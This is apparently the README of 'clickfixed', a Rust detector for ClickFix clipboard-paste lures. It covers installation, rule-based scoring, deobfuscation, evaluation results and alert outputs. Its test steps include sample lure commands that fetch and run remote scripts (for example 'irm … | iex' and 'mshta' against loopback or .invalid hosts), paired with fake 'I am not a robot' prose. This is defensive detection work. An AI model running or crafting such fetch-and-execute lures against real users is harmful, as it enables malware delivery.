# clickfixed

[![ci](https://github.com/uday-kasturi/clickfixed/actions/workflows/ci.yml/badge.svg)](https://github.com/uday-kasturi/clickfixed/actions/workflows/ci.yml)
[![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

Deterministic ClickFix ([MITRE T1204.004](https://attack.mitre.org/techniques/T1204/004/)) detector in Rust. It scores pasted and executed commands with explainable rules, decodes obfuscated commands, and sends alerts to syslog, Jira, Slack or Wazuh.

A ClickFix page tells you to paste a command into the Windows Run dialog or a terminal to "verify you are human". Nothing is exploited or downloaded, so mail filters, browser sandboxes and download reputation never see it, and EDR sees it only after it runs. clickfixed scores the command when the browser writes it to the clipboard, before you paste it. It runs on Windows and Linux.

> [!WARNING]
> `corpus/` holds attack command structures for testing. Every payload host is a `.invalid` placeholder (RFC 2606) that never resolves, and nothing in this repo runs corpus content. The engine decodes statically, in memory.

## Getting started on Windows

Windows 10 or 11. No administrator rights are needed: clickfixed runs as you, because a Windows service can't see your clipboard or which window is in front.

**1. Install the tools.** Install [Git](https://git-scm.com/download/win) and [Rust](https://rustup.rs). The Rust installer offers to install the Visual Studio C++ build tools; accept. Then open a new PowerShell window.

**2. Build clickfixed.**

```powershell
git clone https://github.com/uday-kasturi/clickfixed.git
cd clickfixed
cargo install --locked --path crates/cfx-daemon
```

This puts `clickfixed.exe` in `%USERPROFILE%\.cargo\bin`, which is already on your PATH. (A prebuilt `clickfixed.exe` is also attached to each [CI run](https://github.com/uday-kasturi/clickfixed/actions/workflows/ci.yml) as `clickfixed-windows-x86_64`; downloading it needs a GitHub login.)

**3. Configure.** From the `clickfixed` folder:

```powershell
New-Item -ItemType Directory -Force $env:APPDATA\clickfixed
Copy-Item clickfixed.example.toml $env:APPDATA\clickfixed\config.toml
Copy-Item -Recurse templates $env:APPDATA\clickfixed\
```

The defaults are sensible: warn mode, and alerts written to `%LOCALAPPDATA%\clickfixed\alerts.json`. Set `mode = "block"` in `config.toml` to have clickfixed replace a dangerous clipboard instead of only warning.

**4. Run it.**

```powershell
clickfixed run
```

Leave the window open. clickfixed finds `%APPDATA%\clickfixed\config.toml` on its own.

**5. Check it works.** Open Notepad, type the line below, select it and copy it (Ctrl+C):

```
powershell -c "irm http://127.0.0.1:9/a | iex" # I am not a robot - Verification ID: 2165
```

You get a warning notification. Now press **Win+R**: clickfixed scores the clipboard again for the Run dialog and warns that it would block. Press Esc and don't run it. If no notification appears, turn off Do Not Disturb (click the bell at the bottom right of the taskbar).

**6. Start it at login.** Stop the window from step 4 (Ctrl+C), then:

```powershell
clickfixed autostart enable
```

From the next login it runs with no window, logging to `%LOCALAPPDATA%\clickfixed\clickfixed.log`. `clickfixed autostart status` shows what is registered; `clickfixed autostart disable` turns it off.

**To uninstall:** `clickfixed autostart disable`, then `cargo uninstall clickfixed`, then delete `%APPDATA%\clickfixed` and `%LOCALAPPDATA%\clickfixed`.

## Getting started on Linux

Needs an X11 or XWayland session (the clipboard is read through XFixes). Most GNOME and KDE desktops qualify.

**1. Install the tools.** [Rust](https://rustup.rs) 1.88 or newer, Git, and `notify-send` for notifications:

```sh
sudo apt install git libnotify-bin        # Debian and Ubuntu
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

**2. Build clickfixed.**

```sh
git clone https://github.com/uday-kasturi/clickfixed.git
cd clickfixed
cargo install --locked --path crates/cfx-daemon     # installs ~/.cargo/bin/clickfixed
```

**3. Configure.**

```sh
mkdir -p ~/.config/clickfixed
cp clickfixed.example.toml ~/.config/clickfixed/config.toml
cp -r templates ~/.config/clickfixed/
```

As on Windows, the defaults warn and write alerts to `~/.local/state/clickfixed/alerts.json`. Set `mode = "block"` to replace a dangerous clipboard.

**4. Run it.**

```sh
clickfixed run
```

clickfixed finds `~/.config/clickfixed/config.toml` on its own.

**5. Check it works.** Score a command directly:

```sh
clickfixed check 'mshta https://x.invalid/v.mp4 # I am not a robot'
```

It prints `"level": "block"`. To see the live path, run the safe demo in a second terminal:

```sh
demo/serve.sh            # serves 127.0.0.1:8765 only
```

Open `http://127.0.0.1:8765/lure.html` and click "I'm not a robot". The page copies a `bash -c "$(curl …)"` command and clickfixed shows a notification. If you run the command anyway, it only prints a message.

**6. Start it at login.** Stop the `clickfixed run` from step 4, then:

```sh
mkdir -p ~/.config/systemd/user
cp packaging/clickfixed.service ~/.config/systemd/user/
systemctl --user daemon-reload
systemctl --user enable --now clickfixed
journalctl --user -u clickfixed -f          # watch its log
```

**Optional: catch very short commands.** By default clickfixed polls running processes every 50 ms, which can miss a command that exits sooner. auditd sees every one, but needs root:

```sh
sudo scripts/audit-rules.sh
sudo "$(command -v clickfixed)" run --exec audit --config ~/.config/clickfixed/config.toml
```

**To uninstall:** `systemctl --user disable --now clickfixed`, remove `~/.config/systemd/user/clickfixed.service`, then `cargo uninstall clickfixed` and delete `~/.config/clickfixed` and `~/.local/state/clickfixed`.

## Sending alerts elsewhere

Out of the box, alerts go to a local file. To send them to syslog, a webhook (Slack or anything else), Jira or Wazuh, turn on the matching `[outputs.*]` block in `config.toml`. Secrets such as a Slack URL or Jira token never go in the file: the config names an environment variable (`${CFX_SLACK_WEBHOOK_URL}`), and clickfixed stops at startup, naming any variable that's missing. [`.env.example`](.env.example) lists them.

- **Windows:** set them as user environment variables (System Properties → Environment Variables). Syslog there needs `transport = "udp"` or `"tcp"`, since Windows has no local syslog socket.
- **Linux:** put them in `~/.config/clickfixed/env` as `KEY=value` lines and `chmod 600` it. The systemd unit loads that file.

Check the whole setup without sending anything:

```sh
clickfixed alerts check
```

See [Alerting](#alerting) for what each output does.

## How it works

```
Signal 1  PASTE-TIME   clipboard write → origin → features → shallow decode (≤2 layers, ≤5 ms) → warn/block
Signal 2  EXECUTION    exec event → match against clipboard hashes → alert immediately
Signal 3  POST-HOC     deep decode (≤5 layers, ≤500 ms) → IOC report (URLs, domains, IPs, paths)
```

Each signal runs on its own thread, and none waits on another. On Windows, the clipboard is scored again when the Run dialog or a terminal comes to the front, so a lure pasted into Win+R gets the Run-dialog weighting, and block mode clears it before Ctrl+V.

**Every verdict is a sum you can read.** Each feature is a named rule with a fixed weight in [`rules/default.toml`](crates/cfx-engine/src/rules/default.toml), such as `mshta` with a remote URL, fetch-and-execute, decode-and-execute, a hidden window, or decoy prose like "I am not a robot – Verification ID: 2165". The score is the sum of matched weights, minus allowlist dampening, times a context multiplier (Run dialog ×1.6, unclassified browser origin ×1.3). It warns at 1.0 and blocks at 2.0. Command length, `&&` count and entropy alone are never scored.

**The deobfuscator decodes statically:** base64 (including UTF-16 and gzip), base32, hex, octal and plain hex, percent encoding, char codes, rot13, string reversal, concatenation, the PowerShell format operator, and caret, backtick or quote insertion. Features run on every decoded layer.

**The allowlist only dampens.** Each entry must name a fact the attacker doesn't control (a classified origin, the source app, or a shape such as a JWT or PEM block), and it reduces only the features it lists. The loader rejects literal command strings. See [`rules/allowlist.toml`](crates/cfx-engine/src/rules/allowlist.toml).

Logs carry a hash prefix, the verdict, feature names and the source app, never clipboard content. Warn and Block verdicts write an analysis report to the `reports` folder next to the alert file, readable only by you.

### On Windows

- **Clipboard:** a clipboard listener. The window that owns the clipboard gives the source app, and Chromium and Firefox attach the page URL.
- **Paste target:** a foreground-window hook spots the Run dialog and terminals (Windows Terminal, PowerShell, cmd and console windows).
- **Execution:** a process poller, plus the RunMRU registry key, which records commands run from Win+R even if the process exits too fast to poll.

clickfixed works alongside Microsoft Defender. Defender recognises some lures and stops them when they would start; clickfixed acts earlier, at the copy and when Win+R opens, and alerts on any pasted command that does run.

One consequence: on Windows, don't hand a lure to `clickfixed check` as an argument or through `echo … |`. Defender refuses to start any process whose command line contains one ("Access is denied"), and quarantines files that hold one. Run `clickfixed check -` instead, paste the command, then press Enter, Ctrl+Z and Enter.

### On Linux

- **Clipboard:** X11 selection-owner events through XFixes, with the writing process from XRes.
- **Execution:** `/proc` polling by default, or auditd with `--exec audit`.

On Wayland, copies from native Wayland apps reach clickfixed through the compositor's clipboard bridge, so their browser origin is lost. The content is still scored.

## Results

Fast path on the bundled corpora. Reproduce with `cargo run --release -p cfx-eval -- run`. Full tables are in [`docs/RESULTS.md`](docs/RESULTS.md).

| corpus | rows | result |
|---|---|---|
| Malicious, reconstructed from public reporting | 25 | 25/25 detected, 15 blocked |
| Benign: install docs, dev and admin commands, secrets, terminal output | 400 | 1 false positive (warns, never blocks) |
| Encoded: 41 encoding families × 4 lures | 164 | 164/164 detected, also when typed with no browser context |
| Multi-line decoy prose | 16 | 15/16 |
| Benign look-alikes: encoded data, decode pipelines, scripts | 85 | 0 false positives |

Fast-path latency is p50 45 µs and p99 108 µs, against a 5 ms budget. The Windows build also passes all 19 [end-to-end checks](#windows-end-to-end-test) on Windows 11.

The reconstructed corpus follows command structure from vendor reporting, not sandbox captures, and I wrote the stress rows for this project. Both test the rules, not field detection rates. Expect false positives on clipboards nobody has tried yet, and please report them. [`docs/EVALUATION.md`](docs/EVALUATION.md) has the method and the change log.

## Alerting

Every output renders one ECS alert with the score and verdict, each matched rule and its weight, the command's SHA-256 and decoded form, the origin, host, user, and ATT&CK IDs. The alert never carries the raw clipboard text, and password-manager sources are refused. One severity mapping in the config sets the Wazuh level, syslog and CEF severity, Slack colour and Jira priority.

| output | what it does |
|---|---|
| stdout, file | ECS JSON lines. Wazuh, Filebeat or the Splunk forwarder can tail the file |
| syslog | CEF over UDP, TCP or (Linux) the local socket |
| webhook | POSTs a JSON template: Slack, or anything else you add a template for |
| Jira | One issue per host and command. Repeats add a comment instead of a new ticket |
| Wazuh | Decoder and rules in [`wazuh/`](wazuh/), generated from the severity mapping |

Each output runs on its own thread, so a failing webhook never delays the others. [`docs/ALERTING.md`](docs/ALERTING.md) covers the schema, templates, Jira deduplication and secrets, and [`docs/sample-alert.json`](docs/sample-alert.json) is a full example.

## Development

```sh
cargo test --workspace                     # unit, regression and stress tests
cargo run --release -p cfx-eval -- run     # detection, false positives, latency
cargo run --release -p cfx-eval -- explain 'irm https://x.invalid/a | iex' --target run_dialog --deep
python3 scripts/import_history.py && cargo run --release -p cfx-eval -- run --benign corpus/benign_local.csv
```

The last line scores your own shell history as extra benign rows. The output stays on your machine and is git-ignored.

### Windows end-to-end test

`windows_e2e.exe` drives a real desktop session and checks clickfixed's log and alerts in 19 steps. It copies lures, opens Win+R, pastes and runs a harmless command, opens a terminal, and loads the demo page in Edge. To run it:

```sh
cargo build --release -p cfx-daemon --bin clickfixed --example windows_e2e
```

Put `clickfixed.exe`, `windows_e2e.exe` and the `demo` folder side by side, then run `windows_e2e.exe` from an interactive desktop and leave the keyboard alone for about 40 seconds. Results land in `e2e\report.txt`. On Linux, a disposable Windows 11 VM from [dockur/windows](https://github.com/dockur/windows) works well. It isn't part of GitHub CI, which has no desktop to type into.

### Layout

```
crates/cfx-engine    detection engine, no OS APIs (CI builds it for wasm32 to prove it)
crates/cfx-collect   collectors: clipboard listener, foreground hook, process poller and
                     RunMRU on Windows; X11 clipboard and /proc or auditd on Linux
crates/cfx-daemon    the clickfixed binary, and the Windows end-to-end test (examples/)
crates/cfx-alert     alert schema, severity mapping, outputs
crates/cfx-eval      evaluation harness and regression tests
corpus/              malicious, benign and stress corpora (scripts/ regenerates them)
templates/  wazuh/   alert templates and Wazuh files
demo/  packaging/    safe local lure, systemd unit
docs/                threat model, evaluation, results, alerting
```

## Platform scope

clickfixed runs on Windows and Linux, and CI builds and tests both on every push. The engine is OS-independent; macOS needs its own collectors. [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) covers what is and isn't in scope.

## Upcoming

- **macOS:** pasteboard polling for the clipboard and `eslogger` for process events.
- **Windows, deeper:** ETW or Sysmon Event ID 1 process events, so short-lived processes aren't missed (needs administrator rights), and Win+X menu detection, which counts as a terminal today.

## License

[Apache-2.0](LICENSE)
